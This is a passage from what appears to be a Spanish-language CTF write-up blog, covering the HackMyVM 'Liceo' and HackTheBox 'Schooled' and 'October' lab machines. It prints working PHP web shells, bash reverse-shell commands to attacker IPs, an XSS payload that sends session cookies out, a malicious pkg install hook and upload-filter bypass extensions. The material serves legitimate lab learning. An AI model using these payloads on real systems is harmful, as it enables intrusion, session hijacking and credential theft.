extensiones\nAl final la Ãºnica que estaba bloqueada era .php\nAhora ya podemos ejecutar comandos\n\u0026gt; curl -s -G \u0026#34;192.168.1.149/uploads/shell.phtml\u0026#34; --data-urlencode \u0026#34;telepathy=whoami\u0026#34; www-data QuÃ© cÃ³digo shell.phtml que nos permite ejecutar comandos?\rEl archivo shell.php tiene el siguiente cÃ³digo\n\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt; Lo que hace bÃ¡sicamente es pasarle a la funciÃ³n shell_exec todo lo que recibe por GET por el parÃ¡metro telepathy.\nLa funciÃ³n shell_exec lo que hace es ejecutar comandos en el sistema, pero no muestra el output, para hacer que muestre el output hay que poner el echo delante\nSin echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php Con echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo Si shell_exec no funcionara o estÃ¡ bloqueado, se pueden usar otras funciones, a continuaciÃ³n os dejo unos ejemplos\nsystem()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo passthru()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php passthru(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo exec()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo popen()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php 2 $handle = popen(\u0026#39;whoami\u0026#39;, \u0026#39;r\u0026#39;); 3 $read = fread($handle, 2096); 4 pclose($handle); 5 echo $read; 6 ?\u0026gt; 7 d3bo~\u0026gt; php test.php d3bo IntrusiÃ³n Para ganar acceso a la mÃ¡quina vamos a ponernos en escucha por el puerto 443\nnc -nlvp 443 Y nos mandamos la reverseshell\ncurl -s -G \u0026#34;192.168.1.149/uploads/shell.phtml\u0026#34; --data-urlencode \u0026#34;telepathy=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.145/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Escalada de privilegios Empezamos la escalada buscando archivos con privilegios SUID\nbash-5.1$ find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null .... -rwsr-xr-x 1 root root 47480 Feb 21 2022 /usr/bin/mount -rwsr-xr-x 1 root root 35192 Feb 21 2022 /usr/bin/umount -rwsr-xr-x 1 root root 232416 Apr 3 2023 /usr/bin/sudo -rwsr-sr-x 1 root root 1396520 Jan 6 2022 /usr/bin/bash De todos los archivos que salen hay uno que llama la atenciÃ³n, este es /usr/bin/bash ya que si bash tiene permisos SUID podemos ejecutar bash con -p de privilege y tener una bash de root\nbash-5.1$ /usr/bin/bash -p bash-5.1# whoami root MÃ¡quina terminada\n","date":"2024-03-28","id":21,"permalink":"/writeups/hackmyvm/liceo/","summary":"En esta mÃ¡quina vamos a saltarnos la protecciÃ³n de subida de archivos de la web y escalaremos privilegios mediante un permiso SUID mal implementado","tags":["SUID","File Upload"],"title":"Liceo"},{"content":"","date":"2024-03-28","id":22,"permalink":"/tags/pkg/","summary":"","tags":[],"title":"pkg"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.234 PING 10.10.10.234 (10.10.10.234) 56(84) bytes of data. 64 bytes from 10.10.10.234: icmp_seq=1 ttl=63 time=36.3 ms --- 10.10.10.234 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 36.284/36.284/36.284/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.234 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.234 5 â”‚ [*] Open ports: 22,80,33060 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; nmap -p22,80,33060 -sCV 10.10.10.234 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-title: Schooled - A new kind of educational institute |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\u0026#34; | HY000 | oracle-tns: | Invalid message-frame.\u0026#34; |_ HY000 ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Pues al final no es un linux, nmap ha detectado que estamos frente a un FreeBSD\nPuerto 80 Si observamos la web desde el navegador vemos que es una pÃ¡gina muy simple sin ninguna funciÃ³n que llame la atenciÃ³n. En este puto, podemos mediante la herramienta whatweb intentar sacar un poco de informaciÃ³n\n\u0026gt; whatweb 10.10.10.234 http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge] De toda la informaciÃ³n recopilada lo que mÃ¡s llama la atenciÃ³n es el email admissions@schooled.htb, ya que sale un dominio schooled.htb. A partir de este dominio buscamos subdominios con la herramienta wfuzz\necho \u0026#34;10.10.10.234 schooled.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts \u0026gt; wfuzz -c -t 20 --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.schooled.htb\u0026#34; http://schooled.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000015: 200 461 L 1555 W 20750 Ch \u0026#34;ns\u0026#34; 000000031: 200 461 L 1555 W 20750 Ch \u0026#34;mobile\u0026#34; 000000001: 200 461 L 1555 W 20750 Ch \u0026#34;www\u0026#34; 000000003: 200 461 L 1555 W 20750 Ch \u0026#34;ftp\u0026#34; 000000007: 200 461 L 1555 W 20750 Ch \u0026#34;webdisk\u0026#34; 000000040: 200 461 L 1555 W 20750 Ch \u0026#34;ns4\u0026#34; Todos los subdominios devuelven un cÃ³digo de estado 200, asÃ­ que vamos a usar otro mÃ©todo para filtrar las peticiones que no sea el cÃ³digo de estado, por ejemplo podemos filtrar por la cantidad de caracteres, vamos a ocultar todas las respuestas con 20750 caracteres --hh20750\n\u0026gt; wfuzz -c -t 20 --hh=20750 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.schooled.htb\u0026#34; http://schooled.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000162: 200 1 L 5 W 84 Ch \u0026#34;moodle\u0026#34; Tenemos un subdominio: moodle\necho \u0026#34;10.10.10.234 schooled.htb moodle.schooled.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Este subdominio tiene un moodle instalado.\nPara poder navegar por el moodle, creamos una cuenta.\nDentro del curso de matemÃ¡ticas hay el siguiente mensaje\nEste es un curso de autoinscripciÃ³n. Para los estudiantes que deseen asistir a mis conferencias, asegÃºrese de tener configurado su perfil de MoodleNet. Los estudiantes que no configuren sus perfiles de MoodleNet serÃ¡n eliminados del curso antes de que comience el curso y verificarÃ© a todos los estudiantes que estÃ©n inscritos en este curso. Esperamos verlos a todos pronto. manuel phillips En la configuraciÃ³n de nuestro perfil, modificamos el perfil de MoodleNet. En la nota se menciona que el profesor verifica los perfiles de MoodleNet asÃ­ que podemos probar de hacer un XSS para robarle la cookie al profesor\nCon esto confirmamos que podemos hacer un XSS.\nPara robar la cookie de sesiÃ³n del professor y asÃ­ secuestrar su cuenta, usaremos el siguiente payload\n\u0026lt;img src=x onerror=this.src=\u0026#39;http://10.10.14.20/input.php?cookie=\u0026#39;+document.cookie\u0026gt; DespuÃ©s nos montamos un servidor http con python para recibir la peticiÃ³n con la cookie\n\u0026gt; python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.234 - - [07/Apr/2024 21:13:44] \u0026#34;GET /input.php?cookie=MoodleSession=j7br6s51ia212og0ghc8htd1f8 HTTP/1.1\u0026#34; 200 - Ahora ya tenemos la cookie y podemos secuestrar la sesiÃ³n de Manuel Phillips\nConsultando /theme/upgrade.txt encontramos la versiÃ³n del moodle 3.9\n\u0026gt; curl moodle.schooled.htb/moodle/theme/upgrade.txt This files describes API changes in /theme/* themes, information provided here is intended especially for theme designer. === 3.9 === Con una bÃºsqueda con searchsploit identificamos un exploit para dicha versiÃ³n\n\u0026gt; searchsploit moodle 3.9 ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Moodle 3.9 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50180.py ----------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results \u0026gt; python3 50180.py http://moodle.schooled.htb/moodle --cookie 4ai0o3jlkpct1pcv6a2go5c687 __ __ __ __ __ __ __ __ / \\ /|_ __ _) / \\ _) / \\ __ /| |__| _) _) /| \\__ \\/ |__ /__ \\__/ /__ \\__/ | | __) /__ | â€¢ by lanz Moodle 3.9 - Remote Command Execution (Authenticated as teacher) Course enrolments allowed privilege escalation from teacher role into manager role to RCE [+] Login on site: MoodleSession:4ai0o3jlkpct1pcv6a2go5c687 âœ“ [+] Updating roles to move on manager accout: âœ“ [+] Updating rol manager to enable install plugins: âœ“ [+] Uploading malicious .zip file: âœ“ [+] Executing whoami: âœ“ www [+] Keep breaking ev3rYthiNg!! El exploit ha funcionado!\nPara recibir la reverse shell nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Por Ãºltimo aprovechÃ¡ndonos del plugin que ha subido el exploit para ejecutar comandos vamos a ejecutar el comando para mandarnos la reverse shell\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.8/443 0\u0026gt;\u0026amp;1\u0026#34; curl \u0026#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.8%2F443%200%3E%261%27\u0026#34; Escalada de privilegios Para mejorar la consola vamos a usar el tÃ­pico comando python3 -c 'import pty;pty.spawn(\u0026quot;bash\u0026quot;)'\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; bash: python3: command not found [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ which python3 [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ which python Parece que python no estÃ¡ instalado, pero sÃ­ los buscamos con find sÃ­ que existe\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ find / -name python3 2\u0026gt;/dev/null /usr/local/bin/python3 Esto se debe a que /usr/local/bin no estÃ¡ en el path\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ echo $PATH /sbin:/bin:/usr/sbin:/usr/bin AsÃ­ que para ejecutar el comando anterior necesitamos especificar la ruta completa\n/usr/local/bin/python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; [www@Schooled /]$ ^Z zsh: suspended nc -nlvp 443 \u0026gt; stty raw -echo; fg [1] + continued nc -nlvp 443 reset Ahora ya tenemos una shell en condiciones, pero aÃºn no podemos hacer ctrl + l, para solucionarlo, ejecutamos lo siguiente para hacer que TERM valga xterm y SHELL valga bash\n[www@Schooled /]$ export TERM=xterm [www@Schooled /]$ export SHELL=bash Dentro del archivo config.php de moodle encontramos las credenciales de la base de datos\n[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php \u0026lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u0026gt;dbtype = \u0026#39;mysqli\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;PlaybookMaster2020\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( Nos conectamos\nmysql -u moodle -p Seleccionamos la base de datos moodle\nmoodle@localhost [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | moodle | +--------------------+ moodle@localhost [(none)]\u0026gt; use moddle DespuÃ©s consultamos la tabla de users\nmoodle@localhost [moodle]\u0026gt; select * from mdl_user; Dentro hay un usuario llamado Jamie que casualmente tambiÃ©n existe en el sistema\n[www@Schooled /usr/local/www/apache24/data/moodle]$ cat /etc/passwd | grep jamie jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh AsÃ­ que lo que vamos a hacer es sacar su hash de la base de datos y guardarlo en un archivo llamado hash, para posteriormente romperlo con john\n\u0026gt; john --wordlist=/usr/share/wordlists/rockyou.txt hash Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status !QAZ2wsx (?) Ahora ya tenemos su contraseÃ±a, lo que podemos comprobar es si tiene la misma contraseÃ±a para el sistema\n\u0026gt; ssh jamie@schooled.htb (jamie@schooled.htb) Password for jamie@Schooled: jamie@Schooled:~ $ Efectivamente usa la misma contraseÃ±a\nCon sudo -l observamos que jaime tiene permisos para ejecutar dos comandos\njamie@Schooled:/tmp $ sudo -l User jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install * Con una bÃºsqueda rÃ¡pida en gtfobins encontramos que nos podemos aprovechar de pkg para escalar privilegios.\nPara escalar privilegios vamos a crear un paquete para freebsd, que dentro va a contener un comando para mandarnos una reverse shell\nTF=$(mktemp -d) echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.14/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt; $TF/x.sh fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF Este paquete nos lo pasamos a la mÃ¡quina vÃ­ctima a travÃ©s de un servidor con python, por ejemplo.\ncurl 10.10.14.14/x-1.0.txz --output x-1.0.txz Por Ãºltimo nos ponemos en escucha con nc \u0026rsquo;nc -nlvp 443\u0026rsquo; e instalamos el paquete\nsudo pkg install -y --no-repo-update ./x-1.0.txz Recibimos la shell como root!\n\u0026gt; nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.234] 15909 [root@Schooled /tmp]# ","date":"2024-03-28","id":23,"permalink":"/writeups/hackthebox/schooled/","summary":"Explotamos un XSS en un moodle para robar una cookie de sesiÃ³n, un CVE de modle 3.9 el cual lleva a un RCE, y para la escalada de privilegios, conseguimos ser root a travÃ©s del comando pkg, debido a unos permisos mal implementados en el /etc/sudoers","tags":["XSS","pkg"],"title":"Schooled"},{"content":"","date":"2024-03-28","id":24,"permalink":"/tags/suid/","summary":"","tags":[],"title":"SUID"},{"content":"","date":"2024-03-28","id":25,"permalink":"/tags/xss/","summary":"","tags":[],"title":"XSS"},{"content":"","date":"2024-03-27","id":26,"permalink":"/tags/aslr-bypass/","summary":"","tags":[],"title":"ASLR bypass"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.16 PING 10.10.10.16 (10.10.10.16) 56(84) bytes of data. 64 bytes from 10.10.10.16: icmp_seq=1 ttl=63 time=37.4 ms --- 10.10.10.16 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 37.437/37.437/37.437/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.16 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.16 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; sudo nmap -sCV -p22,80 10.10.10.16 -Pn -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA) | 2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA) | 256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA) |_ 256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) | http-methods: |_ Potentially risky methods: PUT PATCH DELETE |_http-title: October CMS - Vanilla ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 80 Nmap ha reportado que el puerto 80 estÃ¡ abierto y tiene corriendo una web\nCon un whatweb podemos ver a que nos enfrentamos\n\u0026gt; whatweb http://10.10.10.16 http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21] Es un October CMS, con una bÃºsqueda en google podemos encontrar que este CMS tiene el login en el /backend y que las credenciales por defecto son admin:admin. Si probamos de autenticarnos con estas credenciales\u0026hellip; Funciona, ahora ya estamos dentro del panel de administraciÃ³n\nIntrusiÃ³n En el panel de administraciÃ³n hay una secciÃ³n de subida de archivos donde podemos intentar colar un php.\nPrimero intentaremos subir un script bÃ¡sico llamado shell.php con el siguiente cÃ³digo\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Como era de esperar, da error.\nPuede ser que estÃ© bloqueando el archivo basÃ¡ndose en la extensiÃ³n. El siguiente paso serÃ­a probar de mandar el archivo con otras extensiones de php.\n.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nEste proceso lo podemos automatizar con burpsuite desde la secciÃ³n de intruder.\nEmpezamos seleccionando que valor vamos a alterar, en este caso las extensiones\nSeguimos subiendo un archivo con todas las extensiones que harÃ¡n de diccionario para la fuerza bruta\n\u0026gt; /usr/bin/cat extensions.txt php php2 php3 php4 php5 php6 php7 phps phps pht phtm phtml pgif shtml htaccess phar inc hphp ctp module Solo falta darle a start atack.\nBurpsuite lo que va a hacer es sustituir la extensiÃ³n por cada una de las extensiones que le hemos pasado como diccionario. Dando como resultado lo siguiente.\nAquÃ­ podemos apreciar que las peticiones que intentan subir un archivo con una extensiÃ³n bloqueada, dan como resultado un error 400 y las que si han podido subir un archivo devuelven un cÃ³digo 200\nAhora ya podemos acceder a los archivos subidos desde la siguiente ruta\nhttp://10.10.10.16/storage/app/media/ http://10.10.10.16/storage/app/media/shell.php5\nPara ganar acceso a la mÃ¡quina solo queda ponerse en escucha por el puerto 443.\nnc -nvlp 443 Y mandarnos una reverse shell\ncurl -s -G \u0026#34;http://10.10.10.16/storage/app/media/shell.php5\u0026#34; --data-urlencode \u0026#34;cmd=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.38/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Estamos dentro B)\nAntes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Escalada de privilegios Empezamos la escalada buscando archivos con permisos SUID\nfind / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null ... -rwsr-xr-- 1 root dip 323000 Apr 21 2015 /usr/sbin/pppd -rwsr-sr-x 1 libuuid libuuid 17996 Nov 24 2016 /usr/sbin/uuidd -rwsr-xr-x 1 root root 7377 Apr 21 2017 /usr/local/bin/ovrflw Entre todos los encontrados hay uno que llama la atenciÃ³n y es el /usr/local/bin/ovrflw, para ver que es y analizarlo, nos lo vamos a pasar a nuestra mÃ¡quina de atacante\nHe intentado pasÃ¡rmelo a mi mÃ¡quina con un servidor http de python, pero no funciona, asÃ­ que nos lo pasaremos con base64\nMÃ¡quina vÃ­ctima:\nbase64 ovrflw Guardamos todo el output en base64 en un archivo llamado temp.txt en la mÃ¡quina atacante y despuÃ©s lo \u0026ldquo;decodeamos\u0026rdquo; y lo guardamos en un archivo llamado ovrflw\nbase64 -d temp.txt \u0026gt; ovrflw Le damos permisos de ejecuciÃ³n\nchmod +x ovrflw Ya podemos empezar a analizarlo\nAl ejecutarlo nos salta un mensaje explicando el uso del programa\n\u0026gt; ./ovrflw Syntax: ./ovrflw \u0026lt;input string\u0026gt; Nos dice que hay que poner un input como parÃ¡metro\n./ovrflw a Pero no sale nada cuando ponemos algo.\nEs raro, vamos a ver que esta 